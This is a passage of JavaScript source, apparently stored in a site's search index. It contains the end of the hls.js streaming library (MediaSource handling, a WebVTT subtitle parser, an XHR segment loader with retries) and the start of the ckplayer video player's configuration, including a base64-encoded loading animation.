this.onmse); ms.addEventListener('sourceclose', this.onmsc); // link video and media Source media.src = URL.createObjectURL(ms); } } }, { key: 'onMediaDetaching', value: function onMediaDetaching() { _logger.logger.log('media source detaching'); var ms = this.mediaSource; if (ms) { if (ms.readyState === 'open') { try { // endOfStream could trigger exception if any sourcebuffer is in updating state // we don't really care about checking sourcebuffer state here, // as we are anyway detaching the MediaSource // let's just avoid this exception to propagate ms.endOfStream(); } catch (err) { _logger.logger.warn('onMediaDetaching:' + err.message + ' while calling endOfStream'); } } ms.removeEventListener('sourceopen', this.onmso); ms.removeEventListener('sourceended', this.onmse); ms.removeEventListener('sourceclose', this.onmsc); // Detach properly the MediaSource from the HTMLMediaElement as // suggested in https://github.com/w3c/media-source/issues/53. if (this.media) { URL.revokeObjectURL(this.media.src); this.media.removeAttribute('src'); this.media.load(); } this.mediaSource = null; this.media = null; this.pendingTracks = {}; this.tracks = {}; this.sourceBuffer = {}; this.flushRange = []; this.segments = []; this.appended = 0; } this.onmso = this.onmse = this.onmsc = null; this.hls.trigger(_events2.default.MEDIA_DETACHED); } }, { key: 'onMediaSourceOpen', value: function onMediaSourceOpen() { _logger.logger.log('media source opened'); this.hls.trigger(_events2.default.MEDIA_ATTACHED, { media: this.media }); var mediaSource = this.mediaSource; if (mediaSource) { // once received, don't listen anymore to sourceopen event mediaSource.removeEventListener('sourceopen', this.onmso); } this.checkPendingTracks(); } }, { key: 'checkPendingTracks', value: function checkPendingTracks() { // if any buffer codecs pending, check if we have enough to create sourceBuffers var pendingTracks = this.pendingTracks, pendingTracksNb = Object.keys(pendingTracks).length; // if any pending tracks and (if nb of pending tracks gt or equal than expected nb or if unknown expected nb) if (pendingTracksNb && (this.sourceBufferNb ') === -1) { self.cue.id = line; continue; } // Process line as start of a cue. /*falls through*/ case 'CUE': // 40 - Collect cue timings and settings. try { parseCue(line, self.cue, self.regionList); } catch (e) { // In case of an error ignore rest of the cue. self.cue = null; self.state = 'BADCUE'; continue; } self.state = 'CUETEXT'; continue; case 'CUETEXT': var hasSubstring = line.indexOf('-->') !== -1; // 34 - If we have an empty line then report the cue. // 35 - If we have the special substring '-->' then report the cue, // but do not collect the line as we need to process the current // one as a new cue. if (!line || hasSubstring && (alreadyCollectedLine = true)) { // We are done parsing self cue. if (self.oncue) { self.oncue(self.cue); } self.cue = null; self.state = 'ID'; continue; } if (self.cue.text) { self.cue.text += '\\n'; } self.cue.text += line; continue; case 'BADCUE': // BADCUE // 54-62 - Collect and discard the remaining cue. if (!line) { self.state = 'ID'; } continue; } } } catch (e) { // If we are currently parsing a cue, report what we have. if (self.state === 'CUETEXT' && self.cue && self.oncue) { self.oncue(self.cue); } self.cue = null; // Enter BADWEBVTT state if header was not parsed correctly otherwise // another exception occurred so enter BADCUE state. self.state = self.state === 'INITIAL' ? 'BADWEBVTT' : 'BADCUE'; } return this; }, flush: function flush() { var self = this; try { // Finish decoding the stream. self.buffer += self.decoder.decode(); // Synthesize the end of the current cue or region. if (self.cue || self.state === 'HEADER') { self.buffer += '\\n\\n'; self.parse(); } // If we've flushed, parsed, and we're still on the INITIAL state then // that means we don't have enough of the stream to parse the first // line. if (self.state === 'INITIAL') { throw new Error('Malformed WebVTT signature.'); } } catch (e) { throw e; } if (self.onflush) { self.onflush(); } return this; } }; exports.fixLineBreaks = fixLineBreaks; exports.default = VTTParser; },{\"52\":52}],54:[function(_dereq_,module,exports){ 'use strict'; var _vttparser = _dereq_(53); var _vttparser2 = _interopRequireDefault(_vttparser); function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; } var cueString2millis = function cueString2millis(timeString) { var ts = parseInt(timeString.substr(-3)); var secs = parseInt(timeString.substr(-6, 2)); var mins = parseInt(timeString.substr(-9, 2)); var hours = timeString.length > 9 ? parseInt(timeString.substr(0, timeString.indexOf(':'))) : 0; if (isNaN(ts) || isNaN(secs) || isNaN(mins) || isNaN(hours)) { return -1; } ts += 1000 * secs; ts += 60 * 1000 * mins; ts += 60 * 60 * 1000 * hours; return ts; }; var calculateOffset = function calculateOffset(vttCCs, cc, presentationTime) { var currCC = vttCCs[cc]; var prevCC = vttCCs[currCC.prevCC]; // This is the first discontinuity or cues have been processed since the last discontinuity // Offset = current discontinuity time if (!prevCC || !prevCC.new && currCC.new) { vttCCs.ccOffset = vttCCs.presentationOffset = currCC.start; currCC.new = false; return; } // There have been discontinuities since cues were last parsed. // Offset = time elapsed while (prevCC && prevCC.new) { vttCCs.ccOffset += currCC.start - prevCC.start; currCC.new = false; currCC = prevCC; prevCC = vttCCs[currCC.prevCC]; } vttCCs.presentationOffset = presentationTime; }; var WebVTTParser = { parse: function parse(vttByteArray, syncPTS, vttCCs, cc, callBack, errorCallBack) { // Convert byteArray into string, replacing any somewhat exotic linefeeds with \"\\n\", then split on that character. var re = /\\r\\n|\\n\\r|\\n|\\r/g; var vttLines = String.fromCharCode.apply(null, new Uint8Array(vttByteArray)).trim().replace(re, '\\n').split('\\n'); var cueTime = '00:00.000'; var mpegTs = 0; var localTime = 0; var presentationTime = 0; var cues = []; var parsingError = void 0; var inHeader = true; // let VTTCue = VTTCue || window.TextTrackCue; // Create parser object using VTTCue with TextTrackCue fallback on certain browsers. var parser = new _vttparser2.default(); parser.oncue = function (cue) { // Adjust cue timing; clamp cues to start no earlier than - and drop cues that don't end after - 0 on timeline. var currCC = vttCCs[cc]; var cueOffset = vttCCs.ccOffset; // Update offsets for new discontinuities if (currCC && currCC.new) { if (localTime) { // When local time is provided, offset = discontinuity start time - local time cueOffset = vttCCs.ccOffset = currCC.start; } else { calculateOffset(vttCCs, cc, presentationTime); } } if (presentationTime && !localTime) { // If we have MPEGTS but no LOCAL time, offset = presentation time + discontinuity offset cueOffset = presentationTime + vttCCs.ccOffset - vttCCs.presentationOffset; } cue.startTime += cueOffset - localTime; cue.endTime += cueOffset - localTime; // Fix encoding of special characters. TODO: Test with all sorts of weird characters. cue.text = decodeURIComponent(escape(cue.text)); if (cue.endTime > 0) { cues.push(cue); } }; parser.onparsingerror = function (e) { parsingError = e; }; parser.onflush = function () { if (parsingError && errorCallBack) { errorCallBack(parsingError); return; } callBack(cues); }; // Go through contents line by line. vttLines.forEach(function (line) { if (inHeader) { // Look for X-TIMESTAMP-MAP in header. if (line.startsWith('X-TIMESTAMP-MAP=')) { // Once found, no more are allowed anyway, so stop searching. inHeader = false; // Extract LOCAL and MPEGTS. line.substr(16).split(',').forEach(function (timestamp) { if (timestamp.startsWith('LOCAL:')) { cueTime = timestamp.substr(6); } else if (timestamp.startsWith('MPEGTS:')) { mpegTs = parseInt(timestamp.substr(7)); } }); try { // Calculate subtitle offset in milliseconds. // If sync PTS is less than zero, we have a 33-bit wraparound, which is fixed by adding 2^33 = 8589934592. syncPTS = syncPTS < 0 ? syncPTS + 8589934592 : syncPTS; // Adjust MPEGTS by sync PTS. mpegTs -= syncPTS; // Convert cue time to seconds localTime = cueString2millis(cueTime) / 1000; // Convert MPEGTS to seconds from 90kHz. presentationTime = mpegTs / 90000; if (localTime === -1) { parsingError = new Error('Malformed X-TIMESTAMP-MAP: ' + line); } } catch (e) { parsingError = new Error('Malformed X-TIMESTAMP-MAP: ' + line); } // Return without parsing X-TIMESTAMP-MAP line. return; } else if (line === '') { inHeader = false; } } // Parse line by default. parser.parse(line + '\\n'); }); parser.flush(); } }; module.exports = WebVTTParser; },{\"53\":53}],55:[function(_dereq_,module,exports){ 'use strict'; Object.defineProperty(exports, \"__esModule\", { value: true }); var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if (\"value\" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }(); /** * XHR based logger */ var _logger = _dereq_(50); function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError(\"Cannot call a class as a function\"); } } var XhrLoader = function () { function XhrLoader(config) { _classCallCheck(this, XhrLoader); if (config && config.xhrSetup) { this.xhrSetup = config.xhrSetup; } } _createClass(XhrLoader, [{ key: 'destroy', value: function destroy() { this.abort(); this.loader = null; } }, { key: 'abort', value: function abort() { var loader = this.loader; if (loader && loader.readyState !== 4) { this.stats.aborted = true; loader.abort(); } window.clearTimeout(this.requestTimeout); this.requestTimeout = null; window.clearTimeout(this.retryTimeout); this.retryTimeout = null; } }, { key: 'load', value: function load(context, config, callbacks) { this.context = context; this.config = config; this.callbacks = callbacks; this.stats = { trequest: performance.now(), retry: 0 }; this.retryDelay = config.retryDelay; this.loadInternal(); } }, { key: 'loadInternal', value: function loadInternal() { var xhr, context = this.context; if (typeof XDomainRequest !== 'undefined') { xhr = this.loader = new XDomainRequest(); } else { xhr = this.loader = new XMLHttpRequest(); } var stats = this.stats; stats.tfirst = 0; stats.loaded = 0; var xhrSetup = this.xhrSetup; if (xhrSetup) { try { xhrSetup(xhr, context.url); } catch (e) { // fix xhrSetup: (xhr, url) => {xhr.setRequestHeader(\"Content-Language\", \"test\");} // not working, as xhr.setRequestHeader expects xhr.readyState === OPEN xhr.open('GET', context.url, true); xhrSetup(xhr, context.url); } } if (!xhr.readyState) { xhr.open('GET', context.url, true); } if (context.rangeEnd) { xhr.setRequestHeader('Range', 'bytes=' + context.rangeStart + '-' + (context.rangeEnd - 1)); } xhr.onreadystatechange = this.readystatechange.bind(this); xhr.onprogress = this.loadprogress.bind(this); xhr.responseType = context.responseType; // setup timeout before we perform request this.requestTimeout = window.setTimeout(this.loadtimeout.bind(this), this.config.timeout); xhr.send(); } }, { key: 'readystatechange', value: function readystatechange(event) { var xhr = event.currentTarget, readyState = xhr.readyState, stats = this.stats, context = this.context, config = this.config; // don't proceed if xhr has been aborted if (stats.aborted) { return; } // >= HEADERS_RECEIVED if (readyState >= 2) { // clear xhr timeout and rearm it if readyState less than 4 window.clearTimeout(this.requestTimeout); if (stats.tfirst === 0) { stats.tfirst = Math.max(performance.now(), stats.trequest); } if (readyState === 4) { var status = xhr.status; // http status between 200 to 299 are all successful if (status >= 200 && status < 300) { stats.tload = Math.max(stats.tfirst, performance.now()); var data = void 0, len = void 0; if (context.responseType === 'arraybuffer') { data = xhr.response; len = data.byteLength; } else { data = xhr.responseText; len = data.length; } stats.loaded = stats.total = len; var response = { url: xhr.responseURL, data: data }; this.callbacks.onSuccess(response, stats, context); } else { // if max nb of retries reached or if http status between 400 and 499 (such error cannot be recovered, retrying is useless), return error if (stats.retry >= config.maxRetry || status >= 400 && status < 499) { _logger.logger.error(status + ' while loading ' + context.url); this.callbacks.onError({ code: status, text: xhr.statusText }, context); } else { // retry _logger.logger.warn(status + ' while loading ' + context.url + ', retrying in ' + this.retryDelay + '...'); // aborts and resets internal state this.destroy(); // schedule retry this.retryTimeout = window.setTimeout(this.loadInternal.bind(this), this.retryDelay); // set exponential backoff this.retryDelay = Math.min(2 * this.retryDelay, config.maxRetryDelay); stats.retry++; } } } else { // readyState >= 2 AND readyState !==4 (readyState = HEADERS_RECEIVED || LOADING) rearm timeout as xhr not finished yet this.requestTimeout = window.setTimeout(this.loadtimeout.bind(this), config.timeout); } } } }, { key: 'loadtimeout', value: function loadtimeout() { _logger.logger.warn('timeout while loading ' + this.context.url); this.callbacks.onTimeout(this.stats, this.context); } }, { key: 'loadprogress', value: function loadprogress(event) { var stats = this.stats; stats.loaded = event.loaded; if (event.lengthComputable) { stats.total = event.total; } var onProgress = this.callbacks.onProgress; if (onProgress) { // last args is to provide on progress data onProgress(stats, this.context, null); } } }]); return XhrLoader; }(); exports.default = XhrLoader; },{\"50\":50}]},{},[37])(37) }); //# sourceMappingURL=hls.js.map","tags":""},{"title":"","url":"/js/ckplayer/ckplayer.min.js","text":"/* 软件名称：ckplayer 软件版本：X1 软件作者：niandeng 软件网站：http://www.ckplayer.com -------------------------------------------------------------------------------------------------------------------- 开发说明： 使用的主要程序语言：javascript(js)及actionscript3.0(as3.0)(as3.0主要用于flashplayer部分的开发，不在该页面呈现) 功能：播放视频 特点：兼容HTML5-VIDEO(优先)以及FlashPlayer -------------------------------------------------------------------------------------------------------------------- 使用开源代码部分： 1：flashls-http://flashls.org/ ===================================================================================================================== */ function ckplayerConfig() { return { flashvars: {},//用来补充flashvars里的对象 languagePath: '',//语言包文件地址 stylePath: '',//风格包文件地址 config: { fullInteractive: true,//是否开启交互功能 delay: 30,//延迟加载视频，单位：毫秒 timeFrequency: 100,//计算当前播放时间和加载量的时间频率，单位：毫秒 autoLoad: true,//视频是否自动加载 loadNext: 0,//多段视频预加载的段数，设置成0则全部加载 definition: true,//是否使用清晰度组件 subtitle:false,//是否使用多字幕切换组件 playbackRate:true,//是否使用倍速播放组件 smartRemove: true,//是否使用智能清理，使用该功能则在多段时当前播放段之前的段都会被清除出内存，减少对内存的使用 bufferTime: 200,//缓存区的长度，单位：毫秒,不要小于10 rtmpBufferTime:0,//rtmp视频缓存区长度，单位：毫秒 click: true,//是否支持屏幕单击暂停 doubleClick: true,//是否支持屏幕双击全屏 doubleClickInterval: 200,//判断双击的标准，即二次单击间隔的时间差之内判断为是双击，单位：毫秒 keyDown: { space: true,//是否启用空格键切换播放/暂停 left: true,//是否启用左方向键快退 right: true,//是否启用右方向键快进 up: true,//是否支持上方向键增加音量 down: true //是否支持下方向键减少音量 }, timeJump: 10,//快进快退时的秒数 volumeJump: 0.1,//音量调整的数量，大于0小于1的小数 timeScheduleAdjust: 1,//是否可调节调节栏,0不启用，1是启用，2是只能前进（向右拖动），3是只能后退，4是只能前进但能回到第一次拖动时的位置，5是看过的地方可以随意拖动 previewDefaultLoad: true,//预览图片是否默认加载，优点是鼠标第一次经过进度条即可显示预览图片 promptSpotTime: false,//提示点文字是否在前面加上对应时间 buttonMode: { player: false,//鼠标在播放器上是否显示可点击形态 controlBar: false,//鼠标在控制栏上是否显示可点击形态 timeSchedule: true,//鼠标在时间进度条上是否显示可点击形态 volumeSchedule: true //鼠标在音量调节栏上是否显示可点击形态 }, liveAndVod: { //直播+点播=回播功能 open: false,//是否开启，开启该功能需要设置flashvars里live=true vodTime: 2,//可以回看的整点数 start: 'start' //回看请求参数 }, usehardwareeecoder:false,//是否采用硬件加速，只针对flashplayer有效 errorNum: 3,//错误重连次数 playCorrect: false,//是否需要错误修正，这是针对rtmp的 timeCorrect: true,//http视频播放时间错误纠正，有些因为视频格式的问题导致视频没有实际播放结束视频文件就返回了stop命令 m3u8Definition: { //m3u8自动清晰度时按关键字来进行判断 //tags:['200k','110k','400k','600k','1000k'] }, m3u8MaxBufferLength: 30,//m3u8每次缓冲时间，单位：秒数 split: '|',//当视频地址采用字符形式并且需要使用逗号或其它符号来切割数组里定义 timeStamp: '',//一个地址，用来请求当前时间戳，用于播放器内部时间效准 mobileVolumeBarShow: false,//在移动端是否显示音量调节按钮 addCallback: 'adPlay,adPause,playOrPause,videoPlay,videoPause,videoMute,videoEscMute,videoClear,changeVolume,fastBack,fastNext,videoSeek,newVideo,getMetaDate,videoRotation,videoBrightness,videoContrast,videoSaturation,videoHue,videoZoom,videoProportion,videoError,addListener,removeListener,addElement,getElement,deleteElement,elementShow,animate,animateResume,animatePause,deleteAnimate,changeConfig,getConfig,openUrl,fullScreen,quitFullScreen,switchFull,screenshot,custom,changeControlBarShow,getCurrentSrc,changeDefinition,changeSubtitles,changeSubtitlesSize'//需要支持的事件 }, menu: { //版权名称支持 ckkey: '', name: '', link: '', version: '', domain: '', more: [] }, style: { //风格部分内容配置，这里主要配置loading和logo以及广告的部分内容 loading: { //视频加载前显示在播放器中间的图片，如果不需要可以删除该属性 file: 'data:image/swf;base64,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